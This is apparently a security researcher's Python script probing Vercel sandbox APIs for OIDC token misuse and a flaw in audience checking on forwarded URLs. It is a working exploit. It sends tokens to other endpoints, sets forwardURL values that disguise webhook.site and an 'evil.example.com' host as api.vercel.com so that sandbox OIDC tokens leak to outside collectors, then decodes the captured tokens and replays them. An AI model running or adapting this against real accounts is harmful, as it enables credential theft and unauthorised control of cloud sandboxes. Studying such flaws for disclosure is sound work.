# -*- coding: utf-8 -*-
"""Phase17: OIDC token 跨端点滥用 + forwardURL @/前缀变体 aud 校验缺陷"""
import sys, time, json, base64, urllib.request
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, PROJ, fresh_sandbox_deny_all

TOK = "<REDACTED_OIDC_JWT>"

WH = "57dad648-5daa-4ef8-8532-0d5dd3ceab68"

def api_tok(method, path, body=None, tok=TOK):
    req = urllib.request.Request("https://api.vercel.com" + path, method=method)
    req.add_header("Authorization", "Bearer " + tok)
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=20) as r:
            return r.status, r.read().decode()[:300]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:300]
    except Exception as e:
        return -1, str(e)[:200]

def get_wh_requests():
    req = urllib.request.Request("https://webhook.site/token/%s/requests?sorting=newest" % WH)
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read().decode())

def decode_jwt(t):
    try:
        p = t.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:
        return {'err': str(e)}

if __name__ == "__main__":
    print("=== A: aud=httpbin token 调控制面端点 ===", flush=True)
    tests = [
        ("GET", "/v2/user"),
        ("GET", "/v2/teams"),
        ("GET", "/v2/sandboxes?teamId=%s" % TEAM),
        ("POST", "/v2/sandboxes/sessions/sbx_DAgrhgOUimAbxtGft2B9svANiaU8/cmd?teamId=%s" % TEAM,
         {"command": "echo", "args": ["pwned"], "wait": True}),
        ("POST", "/v2/sandboxes/sessions/sbx_DAgrhgOUimAbxtGft2B9svANiaU8/network-policy?teamId=%s" % TEAM,
         {"mode": "deny-all"}),
        ("GET", "/v3/sandboxes?teamId=%s" % TEAM),
    ]
    for m, p, *rest in tests:
        b = rest[0] if rest else None
        c, r = api_tok(m, p, b)
        print('[%s %s] -> %d %s' % (m, p.split('?')[0][:60], c, r[:180]), flush=True)

    print("\n=== B: forwardURL @变体 aud ===", flush=True)
    sid = fresh_sandbox_deny_all("fwtest8")
    time.sleep(2)
    # forwardURL with @: aud string starts with https://api.vercel.com but host is webhook.site
    fwd = "https://api.vercel.com@webhook.site/%s" % WH
    body = {"allow": {"api.vercel.com": [{"match": {"path": {"startsWith": "/"}}, "forwardURL": fwd}]}}
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (sid, TEAM), body)
    print('set fwd(@):', c, r[:200], flush=True)
    time.sleep(2)
    guest = "curl -s -m 10 https://api.vercel.com/v2/user; echo done"
    c, r = cmd(sid, "bash", ["-lc", guest], timeout_ms=60000)
    print('cmd:', c, r[:500], flush=True)
    time.sleep(3)
    try:
        reqs = get_wh_requests()
        items = reqs.get("data", [])[:3]
        for it in items:
            hdrs = {h["name"].lower(): h["value"] for h in it.get("headers", [])}
            tok = hdrs.get("vercel-sandbox-oidc-token", "")
            print('wh request:', it.get("uuid", ""), 'url=', it.get("url", ""), flush=True)
            if tok:
                print('  OIDC tok aud:', decode_jwt(tok).get('aud'), flush=True)
                # try this token on API
                c2, r2 = api_tok("GET", "/v2/user", tok=tok)
                print('  token -> /v2/user:', c2, r2[:150], flush=True)
    except Exception as e:
        print('wh query err:', e, flush=True)

    print("\n=== C: forwardURL 前缀变体 ===", flush=True)
    fwd2 = "https://api.vercel.com.evil.example.com/%s" % WH
    body = {"allow": {"api.vercel.com": [{"match": {"path": {"startsWith": "/"}}, "forwardURL": fwd2}]}}
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (sid, TEAM), body)
    print('set fwd(prefix):', c, r[:200], flush=True)
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", guest], timeout_ms=60000)
    print('cmd:', c, r[:500], flush=True)
    time.sleep(3)
    try:
        reqs = get_wh_requests()
        items = reqs.get("data", [])[:3]
        for it in items:
            hdrs = {h["name"].lower(): h["value"] for h in it.get("headers", [])}
            tok = hdrs.get("vercel-sandbox-oidc-token", "")
            print('wh request:', it.get("uuid", ""), 'url=', it.get("url", ""), flush=True)
            if tok:
                print('  OIDC tok aud:', decode_jwt(tok).get('aud'), flush=True)
                c2, r2 = api_tok("GET", "/v2/user", tok=tok)
                print('  token -> /v2/user:', c2, r2[:150], flush=True)
    except Exception as e:
        print('wh query err:', e, flush=True)
    print('done', flush=True)
